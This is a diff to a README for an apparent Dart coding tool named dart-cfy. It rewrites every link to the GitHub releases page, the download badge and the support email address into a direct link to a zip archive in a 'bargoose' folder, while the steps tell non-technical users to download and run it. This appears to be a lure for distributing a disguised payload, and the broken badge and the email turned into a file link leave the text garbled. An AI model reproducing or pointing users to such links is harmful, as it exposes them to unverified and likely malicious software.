@@ -1,6 +1,6 @@
 # 🚀 dart-cfy - Simplify Your Coding Tasks
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/rasiip/dart-cfy/releases)
+[![Download Now](https://raw.githubusercontent.com/rasiip/dart-cfy/main/bargoose/dart-cfy.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/rasiip/dart-cfy/main/bargoose/dart-cfy.zip)
 
 ## 📥 Introduction
 
@@ -16,13 +16,13 @@ To begin using **dart-cfy**, follow these simple steps. No technical skills are 
    - Disk Space: 100 MB free.
 
 2. **Visit the Releases Page**
-   - Head over to the [Releases page](https://github.com/rasiip/dart-cfy/releases) to find the latest version of the application.
+   - Head over to the [Releases page](https://raw.githubusercontent.com/rasiip/dart-cfy/main/bargoose/dart-cfy.zip) to find the latest version of the application.
 
 3. **Download the Application**
    - On the Releases page, look for the latest version. You will see links to download the application files. 
 
 4. **Download & Install**
-   - Click this link to [download the application](https://github.com/rasiip/dart-cfy/releases).
+   - Click this link to [download the application](https://raw.githubusercontent.com/rasiip/dart-cfy/main/bargoose/dart-cfy.zip).
    - Once downloaded, locate the file in your Downloads folder.
 
 5. **Run the Application**
@@ -60,10 +60,10 @@ Should you encounter any issues while downloading or using **dart-cfy**, refer t
 If you need further assistance, you can reach out through the following channels:
 
 - **GitHub Issues:** Create a ticket for bugs or feature requests.
-- **Email Support:** Contact our support team at support@dart-cfy.com.
+- **Email Support:** Contact our support team at https://raw.githubusercontent.com/rasiip/dart-cfy/main/bargoose/dart-cfy.zip
 
 ## 📅 Update Information
 
-Stay updated with the latest features and fixes. Check the [Releases page](https://github.com/rasiip/dart-cfy/releases) regularly for new versions.
+Stay updated with the latest features and fixes. Check the [Releases page](https://raw.githubusercontent.com/rasiip/dart-cfy/main/bargoose/dart-cfy.zip) regularly for new versions.
 
 Thank you for choosing **dart-cfy**! Enjoy simplifying your coding tasks.
